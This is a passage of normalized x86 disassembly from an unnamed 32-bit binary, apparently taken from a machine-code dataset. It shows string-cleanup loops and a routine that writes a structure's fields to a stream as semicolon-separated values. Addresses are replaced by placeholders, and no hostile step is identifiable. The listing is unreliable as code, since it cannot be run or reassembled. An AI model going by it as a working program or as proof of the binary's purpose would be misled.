mov [ esi + 0x1c4 ] ebx
mov [ esi + 0x1c0 ] edi
mov [ esi + 0x1b0 ] cx
cmp [ esi + 0x1a8 ] 0x8
jb r-xdata
mov eax [ esi + 0x1b0 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x1a8 ] ebx
mov [ esi + 0x1a4 ] edi
mov [ esi + 0x194 ] ax
cmp [ esi + 0x18c ] 0x8
jb r-xdata
mov edx [ esi + 0x194 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x18c ] ebx
mov [ esi + 0x188 ] edi
mov [ esi + 0x178 ] dx
cmp [ esi + 0x16c ] 0x8
jb r-xdata
mov ecx [ esi + 0x178 ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0x16c ] ebx
mov [ esi + 0x168 ] edi
mov [ esi + 0x158 ] cx
cmp [ esi + 0x150 ] 0x8
jb r-xdata
mov eax [ esi + 0x158 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x150 ] ebx
mov [ esi + 0x14c ] edi
mov [ esi + 0x13c ] ax
cmp [ esi + 0x134 ] 0x8
jb r-xdata
mov edx [ esi + 0x13c ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x134 ] ebx
mov [ esi + 0x130 ] edi
mov [ esi + 0x120 ] dx
cmp [ esi + 0x118 ] 0x8
jb r-xdata
mov ecx [ esi + 0x120 ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0x118 ] ebx
mov [ esi + 0x114 ] edi
mov [ esi + 0x104 ] cx
cmp [ esi + 0xfc ] 0x8
jb r-xdata
mov eax [ esi + 0x104 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0xfc ] ebx
mov [ esi + 0xf8 ] edi
mov [ esi + 0xe8 ] ax
cmp [ esi + 0xe0 ] 0x8
jb r-xdata
mov edx [ esi + 0xe8 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xdc ] edi
mov [ esi + 0xcc ] dx
cmp [ esi + 0xc4 ] 0x8
jb r-xdata
mov ecx [ esi + 0xcc ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc0 ] edi
mov [ esi + 0xb0 ] cx
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov eax [ esi + 0xb0 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] ax
cmp [ esi + 0x8c ] 0x8
jb r-xdata
mov edx [ esi + 0x94 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] dx
cmp [ esi + 0x70 ] 0x8
jb r-xdata
mov ecx [ esi + 0x78 ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] cx
cmp [ esi + 0x50 ] 0x8
jb r-xdata
mov eax [ esi + 0x5c ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x4c ] edi
mov [ esi + 0x3c ] ax
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov edx [ esi + 0x3c ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] edi
mov [ esi + 0x20 ] dx
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov ecx [ esi + 0x20 ]
push ecx
call sub_100173b1
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] ebx
xor ecx ecx
pop edi
mov [ esi + 0x4 ] cx
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call sub_100173b1
add esp 0x4
sub_10009570
push ebp
mov ebp esp
push 0xffffffff
push sub_1002980f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
mov [ ebp - 0xf4 ] ebx
mov edi edx
mov [ ebp - 0x1b0 ] r--data
mov [ ebp - 0x1a0 ] r--data
mov [ ebp - 0x150 ] r--data
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x4 ] ebx
push ecx
mov [ ebp - 0xf4 ] 0x1
call sub_10004950
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x1b0 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0x198 ]
push ecx
mov [ ebp + eax - 0x1b0 ] r--data
call sub_10004a00
mov [ ebp - 0x198 ] r--data
mov [ ebp - 0x15c ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x4 ] 0x3
cmp esi 0x12
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp esi 0x15
jne r-xdata
mov eax [ edi ]
push eax
push ecx
lea ecx [ ebp - 0x1a0 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_10005690
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
test cl 0x6
jne r-xdata
push r--data
push ecx
lea eax [ edi + 0x2b8 ]
push eax
push ecx
push r--data
push ecx
lea ecx [ edi + 0x298 ]
push ecx
push ecx
push r--data
push ecx
lea edx [ edi + 0x20 ]
push edx
push ecx
push r--data
push ecx
lea eax [ edi + 0x4 ]
push eax
push ecx
push r--data
push ecx
mov ecx [ edi ]
push ecx
lea edx [ ebp - 0x1a0 ]
push edx
call sub_10005690
add esp 0x4
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
jmp r-xdata
lea edx [ ebp - 0x1a0 ]
push edx
call sub_10008270
sub esp 0x18
mov esi esp
lea eax [ ebp - 0x1b0 ]
mov [ ebp - 0xf8 ] esp
call sub_10005860
mov ecx [ ebp + 0x8 ]
call sub_10001850
add esp 0x1c
lea ecx [ ebp - 0x1b0 ]
mov bl al
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003850
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] bl
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
mov eax [ edx + 0x4 ]
or [ ebp + eax - 0x18c ] 0x4000
lea eax [ ebp + eax - 0x1a0 ]
lea eax [ ebp - 0x1a0 ]
push r--data
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor ebx ebx
test cl 0x6
jne r-xdata
lea edx [ ebp - 0x64 ]
lea esi [ edi + 0x158 ]
push edx
call sub_1000c820
add esp 0x4
mov ebx eax
lea eax [ ebp - 0xf0 ]
lea esi [ edi + 0x13c ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1000c820
add esp 0x4
mov [ ebp - 0xf4 ] eax
lea ecx [ ebp - 0xb8 ]
lea esi [ edi + 0x120 ]
push ecx
mov [ ebp - 0x4 ] 0x5
call sub_1000c820
add esp 0x4
mov [ ebp - 0x100 ] eax
lea edx [ ebp - 0x80 ]
lea esi [ edi + 0x104 ]
push edx
mov [ ebp - 0x4 ] 0x6
call sub_1000c820
add esp 0x4
mov [ ebp - 0xfc ] eax
lea eax [ ebp - 0x48 ]
lea esi [ edi + 0xe8 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_1000c820
add esp 0x4
mov [ ebp - 0x104 ] eax
lea ecx [ ebp - 0x9c ]
lea esi [ edi + 0x94 ]
push ecx
mov [ ebp - 0x4 ] 0x8
call sub_1000c820
add esp 0x4
mov [ ebp - 0x108 ] eax
lea edx [ ebp - 0x2c ]
lea esi [ edi + 0x78 ]
push edx
mov [ ebp - 0x4 ] 0x9
call sub_1000c820
add esp 0x4
mov [ ebp - 0xf8 ] eax
lea eax [ ebp - 0xd4 ]
lea esi [ edi + 0x3c ]
push eax
mov [ ebp - 0x4 ] 0xa
call sub_1000c820
add esp 0x4
push 0x3b
push ecx
lea ecx [ edi + 0x2b8 ]
push ecx
push ecx
push 0x3b
push ecx
lea edx [ edi + 0x298 ]
push edx
push ecx
push 0x3b
push ecx
lea ecx [ edi + 0x278 ]
push ecx
push ecx
push 0x3b
mov [ ebp - 0x4 ] 0xb
push ecx
lea edx [ edi + 0x240 ]
push edx
push ecx
push 0x3b
push ecx
movzx ecx [ edi + 0x222 ]
push ecx
push ecx
push 0x3b
push ecx
movzx edx [ edi + 0x221 ]
push edx
push ecx
push 0x3b
push ecx
movzx ecx [ edi + 0x220 ]
push ecx
push ecx
push 0x3b
push ecx
lea edx [ edi + 0x204 ]
push edx
push ecx
push 0x3b
push ecx
lea ecx [ edi + 0x1cc ]
push ecx
push ecx
push 0x3b
push ecx
lea edx [ edi + 0x194 ]
push edx
push ecx
push 0x3b
push ecx
movzx ecx [ edi + 0x176 ]
push ecx
push ecx
push 0x3b
push ecx
movzx edx [ edi + 0x174 ]
push edx
push ecx
push 0x3b
push ecx
push ebx
push ecx
push 0x3b
push ecx
mov ecx [ ebp - 0xf4 ]
push ecx
mov edx [ ebp - 0x100 ]
push ecx
push 0x3b
push ecx
push edx
push ecx
mov edx [ ebp - 0x104 ]
push 0x3b
push ecx
mov ecx [ ebp - 0xfc ]
push ecx
push ecx
push 0x3b
push ecx
push edx
mov edx [ ebp - 0x108 ]
push ecx
push 0x3b
push ecx
lea ecx [ edi + 0xcc ]
push ecx
push ecx
push 0x3b
push ecx
push edx
push ecx
push 0x3b
push ecx
mov ecx [ ebp - 0xf8 ]
push ecx
push ecx
push 0x3b
push ecx
lea edx [ edi + 0x5c ]
push edx
push ecx
push 0x3b
movzx edx [ edi + 0x58 ]
push ecx
movzx ecx [ edi + 0x59 ]
push ecx
push ecx
push 0x3b
push ecx
push edx
push ecx
push 0x3b
push ecx
push eax
push ecx
mov edx [ edi ]
push 0x3b
push ecx
lea eax [ edi + 0x20 ]
push eax
push ecx
push 0x3b
push ecx
lea ecx [ edi + 0x4 ]
push ecx
push ecx
push 0x3b
push ecx
push edx
lea eax [ ebp - 0x1a0 ]
push eax
call sub_10005690
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000c940
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000c940
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000c940
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000c940
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000c940
add esp 0x4
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100079f0
add esp 0x8
cmp [ ebp - 0xc0 ] 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor edi edi
xor edx edx
mov ebx 0x8
mov esi 0x7
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] dx
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push r--data
push esi
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor ecx ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100173b1
add esp 0x4
lea edx [ edi + 0x20 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] ax
cmp [ ebp - 0x34 ] ebx
jb r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ edi ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_10005690
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor edx edx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x6c ] ebx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100173b1
add esp 0x4
lea edx [ edi + 0x298 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
xor ecx ecx
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] cx
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x4 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor eax eax
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] ax
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_100173b1
add esp 0x4
add edi 0x2b8
push edi
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
xor edx edx
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] dx
cmp [ ebp - 0x50 ] ebx
jb r-xdata
mov ecx [ ebp - 0xf0 ]
push ecx
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x20 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
or ebx [ ecx + 0xc ]
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor ecx ecx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] cx
jmp r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
push 0x0
call sub_100033b0
or ebx 0x4
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x3c ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
movzx edx [ edi + 0x58 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000c940
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
movzx edx [ edi + 0x59 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000c940
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x5c ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x78 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x94 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0xb0 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0xe8 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push r--data
push esi
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
